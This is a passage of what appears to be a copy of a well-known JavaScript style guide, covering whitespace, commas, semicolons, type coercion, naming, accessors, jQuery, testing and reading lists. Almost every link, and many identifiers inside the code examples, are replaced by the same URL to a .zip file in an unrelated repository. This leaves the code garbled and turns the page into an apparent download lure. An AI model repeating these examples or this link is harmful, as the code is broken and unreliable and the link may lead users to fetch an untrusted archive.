    const leds = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('.led').data(data).enter().append('svg:svg').classed('led', true)
        .attr('width', (radius + margin) * 2).append('svg:g')
        .attr('transform', 'translate(' + (radius + margin) + ',' + (radius + margin) + ')')
        .call(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);

    // good
    const leds = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('.led')
        .data(data)
      .enter().append('svg:svg')
        .classed('led', true)
        .attr('width', (radius + margin) * 2)
      .append('svg:g')
        .attr('transform', 'translate(' + (radius + margin) + ',' + (radius + margin) + ')')
        .call(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);

    // good
    const leds = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('.led').data(data);
    ```

  <a name="whitespace--after-blocks"></a><a name="18.7"></a>
  - [18.7](#whitespace--after-blocks) Leave a blank line after blocks and before the next statement. jscs: [`requirePaddingNewLinesAfterBlocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    if (foo) {
      return bar;
    }
    return baz;

    // good
    if (foo) {
      return bar;
    }

    return baz;

    // bad
    const obj = {
      foo() {
      },
      bar() {
      },
    };
    return obj;

    // good
    const obj = {
      foo() {
      },

      bar() {
      },
    };

    return obj;

    // bad
    const arr = [
      function foo() {
      },
      function bar() {
      },
    ];
    return arr;

    // good
    const arr = [
      function foo() {
      },

      function bar() {
      },
    ];

    return arr;
    ```

  <a name="whitespace--padded-blocks"></a><a name="18.8"></a>
  - [18.8](#whitespace--padded-blocks) Do not pad your blocks with blank lines. eslint: [`padded-blocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs:  [`disallowPaddingNewlinesInBlocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    function bar() {

      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);

    }

    // also bad
    if (baz) {

      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(qux);
    } else {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);

    }

    // good
    function bar() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
    }

    // good
    if (baz) {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(qux);
    } else {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
    }
    ```

  <a name="whitespace--in-parens"></a><a name="18.9"></a>
  - [18.9](#whitespace--in-parens) Do not add spaces inside parentheses. eslint: [`space-in-parens`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowSpacesInsideParentheses`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    function bar( foo ) {
      return foo;
    }

    // good
    function bar(foo) {
      return foo;
    }

    // bad
    if ( foo ) {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
    }

    // good
    if (foo) {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
    }
    ```

  <a name="whitespace--in-brackets"></a><a name="18.10"></a>
  - [18.10](#whitespace--in-brackets) Do not add spaces inside brackets. eslint: [`array-bracket-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowSpacesInsideArrayBrackets`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const foo = [ 1, 2, 3 ];
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo[ 0 ]);

    // good
    const foo = [1, 2, 3];
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo[0]);
    ```

  <a name="whitespace--in-braces"></a><a name="18.11"></a>
  - [18.11](#whitespace--in-braces) Add spaces inside curly braces. eslint: [`object-curly-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSpacesInsideObjectBrackets`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const foo = {clark: 'kent'};

    // good
    const foo = { clark: 'kent' };
    ```

  <a name="whitespace--max-len"></a><a name="18.12"></a>
  - [18.12](#whitespace--max-len) Avoid having lines of code that are longer than 100 characters (including whitespace). Note: per [above](#strings--line-length), long strings are exempt from this rule, and should not be broken up. eslint: [`max-len`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`maximumLineLength`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? This ensures readability and maintainability.

    ```javascript
    // bad
    const foo = jsonData && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;

    // bad
    $.ajax({ method: 'POST', url: 'https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip', data: { name: 'John' } }).done(() => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Congratulations!')).fail(() => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('You have failed this city.'));

    // good
    const foo = jsonData
      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;

    // good
    $.ajax({
      method: 'POST',
      url: 'https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip',
      data: { name: 'John' },
    })
      .done(() => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Congratulations!'))
      .fail(() => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('You have failed this city.'));
    ```

**[⬆ back to top](#table-of-contents)**

## Commas

<a name="commas--leading-trailing"></a><a name="19.1"></a>
  - [19.1](#commas--leading-trailing) Leading commas: **Nope.** eslint: [`comma-style`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireCommaBeforeLineBreak`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const story = [
        once
      , upon
      , aTime
    ];

    // good
    const story = [
      once,
      upon,
      aTime,
    ];

    // bad
    const hero = {
        firstName: 'Ada'
      , lastName: 'Lovelace'
      , birthYear: 1815
      , superPower: 'computers'
    };

    // good
    const hero = {
      firstName: 'Ada',
      lastName: 'Lovelace',
      birthYear: 1815,
      superPower: 'computers',
    };
    ```

  <a name="commas--dangling"></a><a name="19.2"></a>
  - [19.2](#commas--dangling) Additional trailing comma: **Yup.** eslint: [`comma-dangle`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireTrailingComma`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? This leads to cleaner git diffs. Also, transpilers like Babel will remove the additional trailing comma in the transpiled code which means you don't have to worry about the [trailing comma problem](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) in legacy browsers.

    ```javascript
    // bad - git diff without trailing comma
    const hero = {
         firstName: 'Florence',
    -    lastName: 'Nightingale'
    +    lastName: 'Nightingale',
    +    inventorOf: ['coxcomb chart', 'modern nursing']
    };

    // good - git diff with trailing comma
    const hero = {
         firstName: 'Florence',
         lastName: 'Nightingale',
    +    inventorOf: ['coxcomb chart', 'modern nursing'],
    };

    // bad
    const hero = {
      firstName: 'Dana',
      lastName: 'Scully'
    };

    const heroes = [
      'Batman',
      'Superman'
    ];

    // good
    const hero = {
      firstName: 'Dana',
      lastName: 'Scully',
    };

    const heroes = [
      'Batman',
      'Superman',
    ];
    ```

**[⬆ back to top](#table-of-contents)**


## Semicolons

  <a name="semicolons--required"></a><a name="20.1"></a>
  - [20.1](#20.1) **Yup.** eslint: [`semi`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSemicolons`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    (function () {
      const name = 'Skywalker'
      return name
    })()

    // good
    (function () {
      const name = 'Skywalker';
      return name;
    }());

    // good, but legacy (guards against the function becoming an argument when two files with IIFEs are concatenated)
    ;(() => {
      const name = 'Skywalker';
      return name;
    }());
    ```

    [Read more](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip%237365214).

**[⬆ back to top](#table-of-contents)**


## Type Casting & Coercion

  <a name="coercion--explicit"></a><a name="21.1"></a>
  - [21.1](#coercion--explicit) Perform type coercion at the beginning of the statement.

  <a name="coercion--strings"></a><a name="21.2"></a>
  - [21.2](#coercion--strings)  Strings:

    ```javascript
    // => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 9;

    // bad
    const totalScore = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip + ''; // invokes https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()

    // bad
    const totalScore = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(); // isn't guaranteed to return a string

    // good
    const totalScore = String(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
    ```

  <a name="coercion--numbers"></a><a name="21.3"></a>
  - [21.3](#coercion--numbers) Numbers: Use `Number` for type casting and `parseInt` always with a radix for parsing strings. eslint: [`radix`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    const inputValue = '4';

    // bad
    const val = new Number(inputValue);

    // bad
    const val = +inputValue;

    // bad
    const val = inputValue >> 0;

    // bad
    const val = parseInt(inputValue);

    // good
    const val = Number(inputValue);

    // good
    const val = parseInt(inputValue, 10);
    ```

  <a name="coercion--comment-deviations"></a><a name="21.4"></a>
  - [21.4](#coercion--comment-deviations) If for whatever reason you are doing something wild and `parseInt` is your bottleneck and need to use Bitshift for [performance reasons](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), leave a comment explaining why and what you're doing.

    ```javascript
    // good
    /**
     * parseInt was the reason my code was slow.
     * Bitshifting the String to coerce it to a
     * Number made it a lot faster.
     */
    const val = inputValue >> 0;
    ```

  <a name="coercion--bitwise"></a><a name="21.5"></a>
  - [21.5](#coercion--bitwise) **Note:** Be careful when using bitshift operations. Numbers are represented as [64-bit values](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), but bitshift operations always return a 32-bit integer ([source](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)). Bitshift can lead to unexpected behavior for integer values larger than 32 bits. [Discussion](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip). Largest signed 32-bit Int is 2,147,483,647:

    ```javascript
    2147483647 >> 0 //=> 2147483647
    2147483648 >> 0 //=> -2147483648
    2147483649 >> 0 //=> -2147483647
    ```

  <a name="coercion--booleans"></a><a name="21.6"></a>
  - [21.6](#coercion--booleans) Booleans:

    ```javascript
    const age = 0;

    // bad
    const hasAge = new Boolean(age);

    // good
    const hasAge = Boolean(age);

    // best
    const hasAge = !!age;
    ```

**[⬆ back to top](#table-of-contents)**


## Naming Conventions

  <a name="naming--descriptive"></a><a name="22.1"></a>
  - [22.1](#naming--descriptive) Avoid single letter names. Be descriptive with your naming. eslint: [`id-length`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    function q() {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    }

    // good
    function query() {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    }
    ```

  <a name="naming--camelCase"></a><a name="22.2"></a>
  - [22.2](#naming--camelCase) Use camelCase when naming objects, functions, and instances. eslint: [`camelcase`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireCamelCaseOrUpperCaseIdentifiers`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const OBJEcttsssss = {};
    const this_is_my_object = {};
    function c() {}

    // good
    const thisIsMyObject = {};
    function thisIsMyFunction() {}
    ```

  <a name="naming--PascalCase"></a><a name="22.3"></a>
  - [22.3](#naming--PascalCase) Use PascalCase only when naming constructors or classes. eslint: [`new-cap`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireCapitalizedConstructors`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    function user(options) {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
    }

    const bad = new user({
      name: 'nope',
    });

    // good
    class User {
      constructor(options) {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
      }
    }

    const good = new User({
      name: 'yup',
    });
    ```

  <a name="naming--leading-underscore"></a><a name="22.4"></a>
  - [22.4](#naming--leading-underscore) Do not use trailing or leading underscores. eslint: [`no-underscore-dangle`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowDanglingUnderscores`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? JavaScript does not have the concept of privacy in terms of properties or methods. Although a leading underscore is a common convention to mean “private”, in fact, these properties are fully public, and as such, are part of your public API contract. This convention might lead developers to wrongly think that a change won't count as breaking, or that tests aren't needed. tl;dr: if you want something to be “private”, it must not be observably present.

    ```javascript
    // bad
    this.__firstName__ = 'Panda';
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 'Panda';
    this._firstName = 'Panda';

    // good
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 'Panda';
    ```

  <a name="naming--self-this"></a><a name="22.5"></a>
  - [22.5](#naming--self-this) Don't save references to `this`. Use arrow functions or [Function#bind](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip). jscs: [`disallowNodeTypes`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    function foo() {
      const self = this;
      return function () {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(self);
      };
    }

    // bad
    function foo() {
      const that = this;
      return function () {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(that);
      };
    }

    // good
    function foo() {
      return () => {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(this);
      };
    }
    ```

  <a name="naming--filename-matches-export"></a><a name="22.6"></a>
  - [22.6](#naming--filename-matches-export) A base filename should exactly match the name of its default export.

    ```javascript
    // file 1 contents
    class CheckBox {
      // ...
    }
    export default CheckBox;

    // file 2 contents
    export default function fortyTwo() { return 42; }

    // file 3 contents
    export default function insideDirectory() {}

    // in some other file
    // bad
    import CheckBox from './checkBox'; // PascalCase import/export, camelCase filename
    import FortyTwo from './FortyTwo'; // PascalCase import/filename, camelCase export
    import InsideDirectory from './InsideDirectory'; // PascalCase import/filename, camelCase export

    // bad
    import CheckBox from './check_box'; // PascalCase import/export, snake_case filename
    import forty_two from './forty_two'; // snake_case import/filename, camelCase export
    import inside_directory from './inside_directory'; // snake_case import, camelCase export
    import index from './inside_directory/index'; // requiring the index file explicitly
    import insideDirectory from './insideDirectory/index'; // requiring the index file explicitly

    // good
    import CheckBox from './CheckBox'; // PascalCase export/import/filename
    import fortyTwo from './fortyTwo'; // camelCase export/import/filename
    import insideDirectory from './insideDirectory'; // camelCase export/import/directory name/implicit "index"
    // ^ supports both https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip and https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    ```

  <a name="naming--camelCase-default-export"></a><a name="22.7"></a>
  - [22.7](#naming--camelCase-default-export) Use camelCase when you export-default a function. Your filename should be identical to your function's name.

    ```javascript
    function makeStyleGuide() {
    }

    export default makeStyleGuide;
    ```

  <a name="naming--PascalCase-singleton"></a><a name="22.8"></a>
  - [22.8](#naming--PascalCase-singleton) Use PascalCase when you export a constructor / class / singleton / function library / bare object.

    ```javascript
    const AirbnbStyleGuide = {
      es6: {
      }
    };

    export default AirbnbStyleGuide;
    ```


**[⬆ back to top](#table-of-contents)**


## Accessors

  <a name="accessors--not-required"></a><a name="23.1"></a>
  - [23.1](#accessors--not-required) Accessor functions for properties are not required.

  <a name="accessors--no-getters-setters"></a><a name="23.2"></a>
  - [23.2](#accessors--no-getters-setters) Do not use JavaScript getters/setters as they cause unexpected side effects and are harder to test, maintain, and reason about. Instead, if you do make accessor functions, use getVal() and setVal('hello').

    ```javascript
    // bad
    class Dragon {
      get age() {
        // ...
      }

      set age(value) {
        // ...
      }
    }

    // good
    class Dragon {
      getAge() {
        // ...
      }

      setAge(value) {
        // ...
      }
    }
    ```

  <a name="accessors--boolean-prefix"></a><a name="23.3"></a>
  - [23.3](#accessors--boolean-prefix) If the property/method is a `boolean`, use `isVal()` or `hasVal()`.

    ```javascript
    // bad
    if (!https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()) {
      return false;
    }

    // good
    if (!https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()) {
      return false;
    }
    ```

  <a name="accessors--consistent"></a><a name="23.4"></a>
  - [23.4](#accessors--consistent) It's okay to create get() and set() functions, but be consistent.

    ```javascript
    class Jedi {
      constructor(options = {}) {
        const lightsaber = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip || 'blue';
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('lightsaber', lightsaber);
      }

      set(key, val) {
        this[key] = val;
      }

      get(key) {
        return this[key];
      }
    }
    ```

**[⬆ back to top](#table-of-contents)**


## Events

  <a name="events--hash"></a><a name="24.1"></a>
  - [24.1](#events--hash) When attaching data payloads to events (whether DOM events or something more proprietary like Backbone events), pass a hash instead of a raw value. This allows a subsequent contributor to add more data to the event payload without finding and updating every handler for the event. For example, instead of:

    ```javascript
    // bad
    $(this).trigger('listingUpdated', https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);

    ...

    $(this).on('listingUpdated', (e, listingId) => {
      // do something with listingId
    });
    ```

    prefer:

    ```javascript
    // good
    $(this).trigger('listingUpdated', { listingId: https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip });

    ...

    $(this).on('listingUpdated', (e, data) => {
      // do something with https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    });
    ```

  **[⬆ back to top](#table-of-contents)**


## jQuery

  <a name="jquery--dollar-prefix"></a><a name="25.1"></a>
  - [25.1](#jquery--dollar-prefix) Prefix jQuery object variables with a `$`. jscs: [`requireDollarBeforejQueryAssignment`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const sidebar = $('.sidebar');

    // good
    const $sidebar = $('.sidebar');

    // good
    const $sidebarBtn = $('.sidebar-btn');
    ```

  <a name="jquery--cache"></a><a name="25.2"></a>
  - [25.2](#jquery--cache) Cache jQuery lookups.

    ```javascript
    // bad
    function setSidebar() {
      $('.sidebar').hide();

      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip

      $('.sidebar').css({
        'background-color': 'pink'
      });
    }

    // good
    function setSidebar() {
      const $sidebar = $('.sidebar');
      $https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip();

      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip

      $https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip({
        'background-color': 'pink'
      });
    }
    ```

  <a name="jquery--queries"></a><a name="25.3"></a>
  - [25.3](#jquery--queries) For DOM queries use Cascading `$('.sidebar ul')` or parent > child `$('.sidebar > ul')`. [jsPerf](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

  <a name="jquery--find"></a><a name="25.4"></a>
  - [25.4](#jquery--find) Use `find` with scoped jQuery object queries.

    ```javascript
    // bad
    $('ul', '.sidebar').hide();

    // bad
    $('.sidebar').find('ul').hide();

    // good
    $('.sidebar ul').hide();

    // good
    $('.sidebar > ul').hide();

    // good
    $https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('ul').hide();
    ```

**[⬆ back to top](#table-of-contents)**


## ECMAScript 5 Compatibility

  <a name="es5-compat--kangax"></a><a name="26.1"></a>
  - [26.1](#es5-compat--kangax) Refer to [Kangax](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)'s ES5 [compatibility table](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).

**[⬆ back to top](#table-of-contents)**

<a name="ecmascript-6-styles"></a>
## ECMAScript 6+ (ES 2015+) Styles

  <a name="es6-styles"></a><a name="27.1"></a>
  - [27.1](#es6-styles) This is a collection of links to the various ES6 features.

1. [Arrow Functions](#arrow-functions)
1. [Classes](#classes--constructors)
1. [Object Shorthand](#es6-object-shorthand)
1. [Object Concise](#es6-object-concise)
1. [Object Computed Properties](#es6-computed-properties)
1. [Template Strings](#es6-template-literals)
1. [Destructuring](#destructuring)
1. [Default Parameters](#es6-default-parameters)
1. [Rest](#es6-rest)
1. [Array Spreads](#es6-array-spreads)
1. [Let and Const](#references)
1. [Iterators and Generators](#iterators-and-generators)
1. [Modules](#modules)

  <a name="tc39-proposals"></a>
  - [27.2](#tc39-proposals) Do not use [TC39 proposals](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) that have not reached stage 3.

    > Why? [They are not finalized](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), and they are subject to change or to be withdrawn entirely. We want to use JavaScript, and proposals are not JavaScript yet.

**[⬆ back to top](#table-of-contents)**

## Testing

  <a name="testing--yup"></a><a name="28.1"></a>
  - [28.1](#testing--yup) **Yup.**

    ```javascript
    function foo() {
      return true;
    }
    ```

  <a name="testing--for-real"></a><a name="28.2"></a>
  - [28.2](#testing--for-real) **No, but seriously**:
   - Whichever testing framework you use, you should be writing tests!
   - Strive to write many small pure functions, and minimize where mutations occur.
   - Be cautious about stubs and mocks - they can make your tests more brittle.
   - We primarily use [`mocha`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) at Airbnb. [`tape`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) is also used occasionally for small, separate modules.
   - 100% test coverage is a good goal to strive for, even if it's not always practical to reach it.
   - Whenever you fix a bug, _write a regression test_. A bug fixed without a regression test is almost certainly going to break again in the future.

**[⬆ back to top](#table-of-contents)**


## Performance

  - [On Layout & Web Performance](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [String vs Array Concat](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Try/Catch Cost In a Loop](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Bang Function](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [jQuery Find vs Context, Selector](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [innerHTML vs textContent for script text](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Long String Concatenation](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Are Javascript functions like `map()`, `reduce()`, and `filter()` optimized for traversing arrays?](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - Loading...

**[⬆ back to top](#table-of-contents)**


## Resources

**Learning ES6**

  - [Draft ECMA 2015 (ES6) Spec](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip~https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [ExploringJS](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [ES6 Compatibility Table](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Comprehensive Overview of ES6 Features](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

**Read This**

  - [Standard ECMA-262](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

**Tools**

  - Code Style Linters
    + [ESlint](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - [Airbnb Style .eslintrc](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
    + [JSHint](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - [Airbnb Style .jshintrc](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
    + [JSCS](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - [Airbnb Style Preset](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

**Other Style Guides**

  - [Google JavaScript Style Guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [jQuery Core Style Guidelines](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Principles of Writing Consistent, Idiomatic JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

**Other Styles**

  - [Naming this in nested functions](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Christian Johansen
  - [Conditional Callbacks](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Ross Allen
  - [Popular JavaScript Coding Conventions on Github](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - JeongHoon Byun
  - [Multiple var statements in JavaScript, not superfluous](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Ben Alman

**Further Reading**

  - [Understanding JavaScript Closures](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Angus Croll
  - [Basic JavaScript for the impatient programmer](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Dr. Axel Rauschmayer
  - [You Might Not Need jQuery](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Zack Bloom & Adam Schwartz
  - [ES6 Features](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Luke Hoban
  - [Frontend Guidelines](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Benjamin De Cock

**Books**

  - [JavaScript: The Good Parts](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Douglas Crockford
  - [JavaScript Patterns](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Stoyan Stefanov
  - [Pro JavaScript Design Patterns](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)  - Ross Harmes and Dustin Diaz
  - [High Performance Web Sites: Essential Knowledge for Front-End Engineers](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Steve Souders
  - [Maintainable JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Nicholas C. Zakas
  - [JavaScript Web Applications](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Alex MacCaw
  - [Pro JavaScript Techniques](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - John Resig
  - [Smashing https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip JavaScript Everywhere](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Guillermo Rauch
  - [Secrets of the JavaScript Ninja](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - John Resig and Bear Bibeault
  - [Human JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Henrik Joreteg
  - [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Kim Joar Bekkelund, Mads Mobæk, & Olav Bjorkoy
  - [JSBooks](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Julien Bouquillon
